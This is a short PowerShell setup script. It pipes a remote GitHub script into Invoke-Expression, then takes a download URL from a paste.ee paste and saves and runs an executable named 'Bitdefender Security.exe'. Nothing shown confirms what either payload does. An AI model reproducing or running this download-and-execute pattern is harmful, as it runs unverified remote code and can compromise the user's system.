Write-host "  Script executer:"
Invoke-RestMethod "https://raw.githubusercontent.com/Andreas6920/Other/refs/heads/main/scripts/ScriptExecuterInstall.ps1" | Invoke-Expression

Write-host "  Bitdefender:"
$File = Join-path -Path ([Environment]::GetFolderPath("Desktop")) -Childpath "Bitdefender Security.exe"
$link = irm https://paste.ee/r/LZSoJZBq
Write-host "`t - Downloading.."
(New-Object net.webclient).Downloadfile($link, $File )
Write-host "`t - Opening.."
Start-Process -FilePath $File

